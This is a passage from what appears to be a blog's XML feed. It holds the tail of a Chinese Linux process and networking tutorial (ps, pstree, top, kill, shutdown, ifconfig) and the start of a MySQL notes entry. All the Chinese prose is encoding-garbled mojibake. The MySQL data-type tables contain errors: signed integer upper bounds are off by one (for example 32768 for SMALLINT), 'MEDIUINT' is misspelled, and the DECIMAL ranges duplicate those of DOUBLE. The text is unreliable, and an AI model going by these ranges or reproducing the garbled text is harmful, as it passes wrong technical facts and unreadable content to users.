<td>åªæ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</td>
</tr>
</tbody>
</table>
<p><strong>å¸¸è§ç”¨æ³•ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps -e æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼ˆç¬æ—¶çš„ï¼‰</p>
</li>
<li class="lvl-2">
<p>ps -u root -N æŸ¥çœ‹æ‰€æœ‰ä¸æ˜¯rootè¿è¡Œçš„è¿›ç¨‹</p>
</li>
<li class="lvl-2">
<p>ps ax æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹çŠ¶æ€çŠ¶æ€</p>
</li>
<li class="lvl-2">
<p>ps -ef |grep xxx æ˜¾ç¤ºå«æœ‰xxxçš„è¿›ç¨‹</p>
</li>
</ul>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ps -A</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">      1 ?        00:00:01 systemd</span><br><span class="line">      2 ?        00:00:00 kthreadd</span><br><span class="line">â€¦â€¦çœç•¥éƒ¨åˆ†ç»“æœ</span><br><span class="line">   2207 ?        00:00:00 kworker/1:1-events</span><br><span class="line">   2208 ?        00:00:00 kworker/0:0-ata_sff</span><br><span class="line">   2215 ?        00:00:00 kworker/0:2-ata_sff</span><br><span class="line">   2217 pts/1    00:00:00 ps</span><br></pre></td></tr></table></figure>
<p>æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -u root //æ˜¾ç¤ºrootè¿›ç¨‹ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"> PID TTY     TIME CMD</span><br><span class="line">  1 ?    00:00:02 init</span><br><span class="line">  2 ?    00:00:00 kthreadd</span><br><span class="line">  3 ?    00:00:00 migration/0</span><br><span class="line">â€¦â€¦çœç•¥éƒ¨åˆ†ç»“æœ</span><br><span class="line">30487 ?    00:00:06 gnome-terminal</span><br><span class="line">30488 ?    00:00:00 gnome-pty-helpe</span><br><span class="line">30489 pts/0  00:00:00 bash</span><br></pre></td></tr></table></figure>
<p>æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼Œè¿åŒå‘½ä»¤è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -ef //æ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤ï¼Œè¿å¸¦å‘½ä»¤è¡Œ</span></span><br><span class="line">UID    PID PPID C STIME TTY     TIME CMD</span><br><span class="line">root     1   0 0 10:22 ?    00:00:02 /sbin/init</span><br><span class="line">root     2   0 0 10:22 ?    00:00:00 [kthreadd]</span><br><span class="line">root     3   2 0 10:22 ?    00:00:00 [migration/0]</span><br><span class="line">root     4   2 0 10:22 ?    00:00:00 [ksoftirqd/0]</span><br><span class="line">root     5   2 0 10:22 ?    00:00:00 [watchdog/0]</span><br><span class="line">root     6   2 0 10:22 ?    /usr/lib/NetworkManager</span><br><span class="line">â€¦â€¦çœç•¥éƒ¨åˆ†ç»“æœ</span><br><span class="line">root   31302 2095 0 17:42 ?    00:00:00 sshd: root@pts/2 </span><br><span class="line">root   31374 31302 0 17:42 pts/2  00:00:00 -bash</span><br><span class="line">root   31400   1 0 17:46 ?    00:00:00 /usr/bin/python /usr/sbin/aptd</span><br><span class="line">root   31407 31374 0 17:48 pts/2  00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
<h2 id="ä»¥æ ‘çŠ¶å›¾æ˜¾ç¤ºè¿›ç¨‹å…³ç³»ï¼špstree">ä»¥æ ‘çŠ¶å›¾æ˜¾ç¤ºè¿›ç¨‹å…³ç³»ï¼špstree</h2>
<p>æ˜¾ç¤ºè¿›ç¨‹çš„å…³ç³»</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# pstree</span><br><span class="line">systemdâ”€â”¬â”€NetworkManagerâ”€â”€â”€2*[&#123;NetworkManager&#125;]</span><br><span class="line">        â”œâ”€atd</span><br><span class="line">        â”œâ”€auditdâ”€â”€â”€&#123;auditd&#125;</span><br><span class="line">        â”œâ”€crond</span><br><span class="line">        â”œâ”€dbus-daemonâ”€â”€â”€&#123;dbus-daemon&#125;</span><br><span class="line">        â”œâ”€firewalldâ”€â”€â”€&#123;firewalld&#125;</span><br><span class="line">        â”œâ”€irqbalanceâ”€â”€â”€&#123;irqbalance&#125;</span><br><span class="line">        â”œâ”€loginâ”€â”€â”€bashâ”€â”€â”€suâ”€â”€â”€bashâ”€â”€â”€suâ”€â”€â”€bash</span><br><span class="line">        â”œâ”€lsmd</span><br><span class="line">        â”œâ”€mcelog</span><br><span class="line">        â”œâ”€polkitdâ”€â”€â”€5*[&#123;polkitd&#125;]</span><br><span class="line">        â”œâ”€smartd</span><br><span class="line">        â”œâ”€sshdâ”€â”¬â”€sshdâ”€â”€â”€sshdâ”€â”€â”€bash</span><br><span class="line">        â”‚      â””â”€sshdâ”€â”€â”€sshdâ”€â”€â”€bashâ”€â”€â”€pstree</span><br><span class="line">        â”œâ”€systemdâ”€â”€â”€(sd-pam)</span><br><span class="line">        â”œâ”€systemd-journal</span><br><span class="line">        â”œâ”€systemd-logind</span><br><span class="line">        â”œâ”€systemd-udevd</span><br><span class="line">        â””â”€tunedâ”€â”€â”€3*[&#123;tuned&#125;]</span><br><span class="line">        </span><br><span class="line">[root@rocky8:~]# pstree -p</span><br><span class="line">systemd(1)â”€â”¬â”€NetworkManager(816)â”€â”¬â”€&#123;NetworkManager&#125;(821)</span><br><span class="line">           â”‚                     â””â”€&#123;NetworkManager&#125;(823)</span><br><span class="line">           â”œâ”€atd(835)</span><br><span class="line">           â”œâ”€auditd(768)â”€â”€â”€&#123;auditd&#125;(769)</span><br><span class="line">           â”œâ”€crond(841)</span><br><span class="line">           â”œâ”€dbus-daemon(796)â”€â”€â”€&#123;dbus-daemon&#125;(802)</span><br><span class="line">           â”œâ”€firewalld(797)â”€â”€â”€&#123;firewalld&#125;(1030)</span><br><span class="line">           â”œâ”€irqbalance(792)â”€â”€â”€&#123;irqbalance&#125;(801)</span><br><span class="line">           â”œâ”€login(838)â”€â”€â”€bash(2012)â”€â”€â”€su(2043)â”€â”€â”€bash(2044)â”€â”€â”€su(2072)â”€â”€â”€bash(2076)</span><br><span class="line">           â”œâ”€lsmd(793)</span><br><span class="line">           â”œâ”€mcelog(798)</span><br><span class="line">           â”œâ”€polkitd(1035)â”€â”¬â”€&#123;polkitd&#125;(1051)</span><br><span class="line">           â”‚               â”œâ”€&#123;polkitd&#125;(1052)</span><br><span class="line">           â”‚               â”œâ”€&#123;polkitd&#125;(1058)</span><br><span class="line">           â”‚               â”œâ”€&#123;polkitd&#125;(1059)</span><br><span class="line">           â”‚               â””â”€&#123;polkitd&#125;(1072)</span><br><span class="line">           â”œâ”€smartd(790)</span><br><span class="line">           â”œâ”€sshd(829)â”€â”¬â”€sshd(1577)â”€â”€â”€sshd(1592)â”€â”€â”€bash(1593)</span><br><span class="line">           â”‚           â””â”€sshd(1859)â”€â”€â”€sshd(1863)â”€â”€â”€bash(1864)â”€â”€â”€pstree(2220)</span><br><span class="line">           â”œâ”€systemd(1582)â”€â”€â”€(sd-pam)(1586)</span><br><span class="line">           â”œâ”€systemd-journal(633)</span><br><span class="line">           â”œâ”€systemd-logind(794)</span><br><span class="line">           â”œâ”€systemd-udevd(662)</span><br><span class="line">           â””â”€tuned(827)â”€â”¬â”€&#123;tuned&#125;(1168)</span><br><span class="line">                        â”œâ”€&#123;tuned&#125;(1217)</span><br><span class="line">                        â””â”€&#123;tuned&#125;(1248)</span><br><span class="line">[root@rocky8:~]# pstree -c</span><br><span class="line">systemdâ”€â”¬â”€NetworkManagerâ”€â”¬â”€&#123;NetworkManager&#125;</span><br><span class="line">        â”‚                â””â”€&#123;NetworkManager&#125;</span><br><span class="line">        â”œâ”€atd</span><br><span class="line">        â”œâ”€auditdâ”€â”€â”€&#123;auditd&#125;</span><br><span class="line">        â”œâ”€crond</span><br><span class="line">        â”œâ”€dbus-daemonâ”€â”€â”€&#123;dbus-daemon&#125;</span><br><span class="line">        â”œâ”€firewalldâ”€â”€â”€&#123;firewalld&#125;</span><br><span class="line">        â”œâ”€irqbalanceâ”€â”€â”€&#123;irqbalance&#125;</span><br><span class="line">        â”œâ”€loginâ”€â”€â”€bashâ”€â”€â”€suâ”€â”€â”€bashâ”€â”€â”€suâ”€â”€â”€bash</span><br><span class="line">        â”œâ”€lsmd</span><br><span class="line">        â”œâ”€mcelog</span><br><span class="line">        â”œâ”€polkitdâ”€â”¬â”€&#123;polkitd&#125;</span><br><span class="line">        â”‚         â”œâ”€&#123;polkitd&#125;</span><br><span class="line">        â”‚         â”œâ”€&#123;polkitd&#125;</span><br><span class="line">        â”‚         â”œâ”€&#123;polkitd&#125;</span><br><span class="line">        â”‚         â””â”€&#123;polkitd&#125;</span><br><span class="line">        â”œâ”€smartd</span><br><span class="line">        â”œâ”€sshdâ”€â”¬â”€sshdâ”€â”€â”€sshdâ”€â”€â”€bash</span><br><span class="line">        â”‚      â””â”€sshdâ”€â”€â”€sshdâ”€â”€â”€bashâ”€â”€â”€pstree</span><br><span class="line">        â”œâ”€systemdâ”€â”€â”€(sd-pam)</span><br><span class="line">        â”œâ”€systemd-journal</span><br><span class="line">        â”œâ”€systemd-logind</span><br><span class="line">        â”œâ”€systemd-udevd</span><br><span class="line">        â””â”€tunedâ”€â”¬â”€&#123;tuned&#125;</span><br><span class="line">                â”œâ”€&#123;tuned&#125;</span><br><span class="line">                â””â”€&#123;tuned&#125;</span><br></pre></td></tr></table></figure>
<p>ç‰¹åˆ«è¡¨æ˜åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -apnh //æ˜¾ç¤ºè¿›ç¨‹é—´çš„å…³ç³»</span></span><br></pre></td></tr></table></figure>
<p>åŒæ—¶æ˜¾ç¤ºç”¨æˆ·åç§°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pstree -u //æ˜¾ç¤ºç”¨æˆ·åç§°</span></span><br></pre></td></tr></table></figure>
<h2 id="åŠ¨æ€æ˜¾ç¤ºè¿›ç¨‹ï¼štop">åŠ¨æ€æ˜¾ç¤ºè¿›ç¨‹ï¼štop</h2>
<p>topå‘½ä»¤ç”¨æ¥åŠ¨æ€æ˜¾ç¤ºè¿è¡Œä¸­çš„è¿›ç¨‹ã€‚topå‘½ä»¤èƒ½å¤Ÿåœ¨è¿è¡Œåï¼Œåœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”æ›´æ–°æ˜¾ç¤ºä¿¡æ¯ã€‚-då‚æ•°å¯ä»¥æŒ‡å®šæ˜¾ç¤ºä¿¡æ¯æ›´æ–°çš„æ—¶é—´é—´éš”ã€‚</p>
<p>åœ¨topå‘½ä»¤æ‰§è¡Œåï¼Œå¯ä»¥æŒ‰ä¸‹æŒ‰é”®å¾—åˆ°å¯¹æ˜¾ç¤ºçš„ç»“æœè¿›è¡Œæ’åºï¼š</p>
<table>
<thead>
<tr>
<th>æŒ‰é”®</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>M</td>
<td>æ ¹æ®å†…å­˜ä½¿ç”¨é‡æ¥æ’åº</td>
</tr>
<tr>
<td>P</td>
<td>æ ¹æ®CPUå æœ‰ç‡æ¥æ’åº</td>
</tr>
<tr>
<td>T</td>
<td>æ ¹æ®è¿›ç¨‹è¿è¡Œæ—¶é—´çš„é•¿çŸ­æ¥æ’åº</td>
</tr>
<tr>
<td>U</td>
<td>å¯ä»¥æ ¹æ®åé¢è¾“å…¥çš„ç”¨æˆ·åæ¥ç­›é€‰è¿›ç¨‹</td>
</tr>
<tr>
<td>K</td>
<td>å¯ä»¥æ ¹æ®åé¢è¾“å…¥çš„PIDæ¥æ€æ­»è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td>q</td>
<td>é€€å‡º</td>
</tr>
<tr>
<td>h</td>
<td>è·å¾—å¸®åŠ©</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# top</span><br><span class="line">top - 15:40:09 up  4:53,  3 <span class="built_in">users</span>,  load average: 1.06, 0.72, 0.37</span><br><span class="line">Tasks: 161 total,   2 running, 159 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.5 <span class="built_in">id</span>,  0.0 wa,  0.2 hi,  0.0 si,  0.0 st</span><br><span class="line">MiB Mem :   1746.4 total,   1230.0 free,    246.9 used,    269.5 buff/cache</span><br><span class="line">MiB Swap:   2068.0 total,   2068.0 free,      0.0 used.   1340.5 avail Mem </span><br><span class="line"></span><br><span class="line">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                          </span><br><span class="line">    827 root      20   0  618180  31188  15248 S   0.3   1.7   0:30.76 tuned                                                            </span><br><span class="line">      1 root      20   0  175088  13464   9064 S   0.0   0.8   0:01.40 systemd                                                          </span><br><span class="line">      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 kthreadd                                                         </span><br><span class="line">      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp                                                           </span><br><span class="line">      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_par_gp                                                       </span><br><span class="line">      5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 slub_flushwq </span><br><span class="line">      ..................</span><br></pre></td></tr></table></figure>
<p>æ›´é«˜çº§çš„å‘½ä»¤æ˜¯htopï¼Œä½†éœ€è¦å®‰è£…ï¼š</p>
<p><img src="/posts/dd673edb//image-20250220163058799.png" alt="htopåŠ¨æ€è¿›ç¨‹"></p>
<h2 id="ç»ˆæ­¢è¿›ç¨‹ï¼škill">ç»ˆæ­¢è¿›ç¨‹ï¼škill</h2>
<p>killå‘½ä»¤æŒ‡å®šè¿›ç¨‹å·çš„è¿›ç¨‹ï¼Œéœ€è¦é…åˆ ps ä½¿ç”¨ã€‚</p>
<p>ä½¿ç”¨æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> [-signal] pid</span><br></pre></td></tr></table></figure>
<p>ä¿¡å·å€¼ä»0åˆ°15ï¼Œå…¶ä¸­9ä¸ºç»å¯¹ç»ˆæ­¢ï¼Œå¯ä»¥å¤„ç†ä¸€èˆ¬ä¿¡å·æ— æ³•ç»ˆæ­¢çš„è¿›ç¨‹ã€‚</p>
<h2 id="å…³æœºé‡å¯ï¼šrebootã€shutdownã€init">å…³æœºé‡å¯ï¼šrebootã€shutdownã€init</h2>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>reboot</td>
<td>é‡æ–°å¯åŠ¨æ“ä½œç³»ç»Ÿ</td>
</tr>
<tr>
<td>shutdown â€“r now</td>
<td>é‡æ–°å¯åŠ¨æ“ä½œç³»ç»Ÿï¼Œshutdownä¼šç»™åˆ«çš„ç”¨æˆ·æç¤º</td>
</tr>
<tr>
<td>shutdown -h now</td>
<td>ç«‹åˆ»å…³æœºï¼Œå…¶ä¸­nowç›¸å½“äºæ—¶é—´ä¸º0çš„çŠ¶æ€</td>
</tr>
<tr>
<td>shutdown -h 20:25</td>
<td>ç³»ç»Ÿåœ¨ä»Šå¤©çš„20:25 ä¼šå…³æœº</td>
</tr>
<tr>
<td>shutdown -h +10</td>
<td>ç³»ç»Ÿå†è¿‡ååˆ†é’Ÿåè‡ªåŠ¨å…³æœº</td>
</tr>
<tr>
<td>init 0</td>
<td>å…³æœº</td>
</tr>
<tr>
<td>init 6</td>
<td>é‡å¯</td>
</tr>
</tbody>
</table>
<h2 id="æŸ¥çœ‹æˆ–é…ç½®ç½‘å¡ä¿¡æ¯ï¼šifconfig">æŸ¥çœ‹æˆ–é…ç½®ç½‘å¡ä¿¡æ¯ï¼šifconfig</h2>
<p>ifconfigæ˜¾ç¤ºæ‰€æœ‰ç½‘å¡çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig</span><br><span class="line">ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet6 fe80::20c:29ff:fee9:9fb3  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:e9:9f:b3  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 34362  bytes 34209026 (32.6 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17179  bytes 1644986 (1.5 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 48  bytes 4080 (3.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ip:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">sudo</span> ifconfig ens33 192.168.40.10</span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€MySQLã€‘MYSQLçŸ¥è¯†æ€»ç»“</title>
    <url>/posts/c826a854/</url>
    <content><![CDATA[<h2 id="æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼">æ•°æ®åº“çš„ä¸‰å¤§èŒƒå¼</h2>
<p>1ã€ç¬¬ä¸€èŒƒå¼(1NF)æ˜¯æŒ‡æ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸºæœ¬æ•°æ®çº¿ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯åˆ—çš„å€¼å…·æœ‰åŸå­æ€§ï¼Œä¸å¯å†åˆ†å‰²ã€‚<br>
2ã€ç¬¬äºŒèŒƒå¼(2NF)æ˜¯åœ¨ç¬¬ä¸€èŒƒå¼(1NF)çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥å¾—ï¼Œæ»¡è¶³ç¬¬äºŒèŒƒå¼(2NF)å¿…é¡»å…ˆæ»¡è¶³ç¬¬ä¸€èŒƒå¼(1NF)ã€‚å¦‚æœè¡¨æ˜¯å•ä¸»é”®ï¼Œé‚£ä¹ˆä¸»é”®ä»¥å¤–çš„åˆ—å¿…é¡»å®Œå…¨ä¾èµ–äºä¸»é”®ï¼›å¦‚æœè¡¨æ˜¯å¤åˆä¸»é”®ï¼Œé‚£ä¹ˆä¸»é”®ä»¥å¤–çš„åˆ—å¿…é¡»å®Œå…¨ä¾èµ–äºä¸»é”®ï¼Œä¸èƒ½ä»…ä¾èµ–ä¸»é”®çš„ä¸€éƒ¨åˆ†ã€‚<br>
3ã€ç¬¬ä¸‰èŒƒå¼(3NF)æ˜¯åœ¨ç¬¬äºŒèŒƒå¼çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œå³æ»¡è¶³ç¬¬ä¸‰èŒƒå¼å¿…é¡»è¦å…ˆæ»¡è¶³ç¬¬äºŒèŒƒå¼ã€‚ç¬¬ä¸‰èŒƒå¼(3NF)è¦æ±‚ï¼šè¡¨ä¸­çš„éä¸»é”®åˆ—å¿…é¡»å’Œä¸»é”®ç›´æ¥ç›¸å…³è€Œä¸èƒ½é—´æ¥ç›¸å…³ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼šéä¸»é”®åˆ—ä¹‹é—´ä¸èƒ½ç›¸å…³ä¾èµ–ã€‚</p>
<h2 id="SQLç®€è¿°">SQLç®€è¿°</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>SQLçš„æ¦‚è¿°</strong></p>
</li>
</ul>
<p>Structure Query Language(ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€)ç®€ç§°SQLï¼Œå®ƒè¢«ç¾å›½å›½å®¶æ ‡å‡†å±€(ANSI)ç¡®å®šä¸ºå…³ç³»å‹æ•°æ®åº“è¯­è¨€çš„ç¾å›½æ ‡å‡†ï¼Œåè¢«å›½é™…åŒ–æ ‡å‡†ç»„ç»‡(ISO)é‡‡çº³ä¸ºå…³ç³»æ•°æ®åº“è¯­è¨€çš„å›½é™…æ ‡å‡†ã€‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå¯ä»¥é€šè¿‡SQLç®¡ç†æ•°æ®åº“ï¼›å®šä¹‰å’Œæ“ä½œæ•°æ®ï¼Œç»´æŠ¤æ•°æ®çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚</p>
<h3 id="SQLçš„ä¼˜ç‚¹">SQLçš„ä¼˜ç‚¹</h3>
<p>1ã€ç®€å•æ˜“å­¦ï¼Œå…·æœ‰å¾ˆå¼ºçš„æ“ä½œæ€§<br>
2ã€ç»å¤§å¤šæ•°é‡è¦çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå‡æ”¯æŒSQL<br>
3ã€é«˜åº¦éè¿‡ç¨‹åŒ–ï¼›ç”¨SQLæ“ä½œæ•°æ®åº“æ—¶å¤§éƒ¨åˆ†çš„å·¥ä½œç”±DBMSè‡ªåŠ¨å®Œæˆ</p>
<h3 id="SQLçš„åˆ†ç±»">SQLçš„åˆ†ç±»</h3>
<p>1ã€DDL(Data Definition Language) æ•°æ®å®šä¹‰è¯­è¨€ï¼Œç”¨æ¥æ“ä½œæ•°æ®åº“ã€è¡¨ã€åˆ—ç­‰ï¼› å¸¸ç”¨è¯­å¥ï¼šCREATEã€ ALTERã€DROP<br>
2ã€DML(Data Manipulation Language) æ•°æ®æ“ä½œè¯­è¨€ï¼Œç”¨æ¥æ“ä½œæ•°æ®åº“ä¸­è¡¨é‡Œçš„æ•°æ®ï¼›å¸¸ç”¨è¯­å¥ï¼šINSERTã€ UPDATEã€ DELETE<br>
3ã€DCL(Data Control Language) æ•°æ®æ§åˆ¶è¯­è¨€ï¼Œç”¨æ¥æ“ä½œè®¿é—®æƒé™å’Œå®‰å…¨çº§åˆ«ï¼› å¸¸ç”¨è¯­å¥ï¼šGRANTã€DENY<br>
4ã€DQL(Data Query Language) æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼Œç”¨æ¥æŸ¥è¯¢æ•°æ® å¸¸ç”¨è¯­å¥ï¼šSELECT</p>
<span id="more"></span>
<h3 id="SQLé€šç”¨è¯­æ³•">SQLé€šç”¨è¯­æ³•</h3>
<ol>
<li class="lvl-3">
<p>SQLè¯­å¥å¯ä»¥å•è¡Œæˆ–å¤šè¡Œä¹¦å†™ï¼Œä»¥åˆ†å·ç»“å°¾</p>
</li>
<li class="lvl-3">
<p>å¯ä½¿ç”¨ç©ºæ ¼å’Œç¼©è¿›æ¥å¢å¼ºè¯­å¥çš„å¯è¯»æ€§</p>
</li>
<li class="lvl-3">
<p>MySQLæ•°æ®åº“çš„SQLè¯­å¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œå»ºè®®ä½¿ç”¨å¤§å†™ï¼Œä¾‹å¦‚ï¼šSELECT * FROM userã€‚</p>
</li>
<li class="lvl-3">
<p>åŒæ ·å¯ä»¥ä½¿ç”¨/**/çš„æ–¹å¼å®Œæˆæ³¨é‡Š</p>
</li>
<li class="lvl-3">
<p>MySQLä¸­çš„æˆ‘ä»¬å¸¸ä½¿ç”¨çš„æ•°æ®ç±»å‹å¦‚ä¸‹</p>
</li>
</ol>
<p><img src="/posts/c826a854//image-20241210133749260.png" alt="image-20241210133749260"></p>
<h2 id="æ•°æ®åº“çš„æ•°æ®ç±»å‹">æ•°æ®åº“çš„æ•°æ®ç±»å‹</h2>
<p>MySQLæ•°æ®åº“æä¾›äº†å¤šç§æ•°æ®ç±»å‹ï¼Œå…¶ä¸­åŒ…æ‹¬æ•´æ•°ç±»å‹ã€æµ®ç‚¹æ•°ç±»å‹ã€å®šç‚¹ æ•°ç±»å‹ã€æ—¥æœŸå’Œæ—¶é—´ç±»å‹ã€å­—ç¬¦ä¸²ç±»å‹ã€äºŒè¿›åˆ¶â€¦ç­‰ç­‰æ•°æ®ç±»å‹ã€‚</p>
<h3 id="æ•´æ•°ç±»å‹">æ•´æ•°ç±»å‹</h3>
<p>æ ¹æ®æ•°å€¼å–å€¼èŒƒå›´çš„ä¸åŒMySQL ä¸­çš„æ•´æ•°ç±»å‹å¯åˆ†ä¸º5ç§ï¼Œä¸‹å›¾åˆ—ä¸¾äº† MySQLä¸åŒæ•´æ•°ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚å¤§å°å’Œå–å€¼èŒƒå›´è€Œæœ€å¸¸ç”¨çš„ä¸ºINTç±»å‹çš„ï¼Œ</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å­—èŠ‚æ•°</th>
<th>æ— ç¬¦å·æ•°çš„å–å€¼èŒƒå›´</th>
<th>æœ‰ç¬¦å·æ•°çš„å–å€¼èŒƒå›´</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>0~255</td>
<td>-128~127</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>0~65535</td>
<td>-32768~32768</td>
</tr>
<tr>
<td>MEDIUINT</td>
<td>3</td>
<td>0~16777215</td>
<td>-8388608~8388608</td>
</tr>
<tr>
<td>INTï¼ˆæœ€å¸¸è§ï¼‰</td>
<td>4</td>
<td>0~4294967295</td>
<td>-2147483648~ 2147483648</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>0~18446744073709551615</td>
<td>-9223372036854775808~9223372036854775808</td>
</tr>
</tbody>
</table>
<p><font class="notice">æ³¨ï¼šINTåˆå¯å†™ä¸ºinteger</font></p>
<h3 id="æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹">æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹</h3>
<p>åœ¨MySQLæ•°æ®åº“ä¸­ä½¿ç”¨æµ®ç‚¹æ•°å’Œå®šç‚¹æ•°æ¥å­˜å‚¨å°æ•°ã€‚æµ®ç‚¹æ•°çš„ç±»å‹æœ‰ä¸¤ç§ï¼šå•ç²¾åº¦æµ®ç‚¹æ•°ç±»å‹ï¼ˆFLOAT)å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°ç±»å‹ï¼ˆDOUBLE)ã€‚è€Œå®šç‚¹æ•°ç±»å‹åªæœ‰ä¸€ç§å³DECIMALç±»å‹ã€‚ä¸‹å›¾åˆ—ä¸¾äº† MySQLä¸­æµ®ç‚¹æ•°å’Œå®šç‚¹æ•°ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚å¤§å°åŠå…¶å–å€¼èŒƒå›´ï¼š</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å­—èŠ‚æ•°</th>
<th>æœ‰ç¬¦å·æ•°å–å€¼èŒƒå›´</th>
<th>æ— ç¬¦å·æ•°å–å€¼èŒƒå›´</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOAT</td>
<td>4</td>
<td>-3.402823466E+38~-1.175494351E-38</td>
<td>0å’Œ1.175494351E-38~3.402823466E+38</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0å’Œ2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
<tr>
<td>DECIMALï¼ˆM,Dï¼‰</td>
<td>M+2</td>
<td>-1.7976931348623157E+308~2.2250738585072014E-308</td>
<td>0å’Œ2.2250738585072014E-308~1.7976931348623157E+308</td>
</tr>
</tbody>
</table>
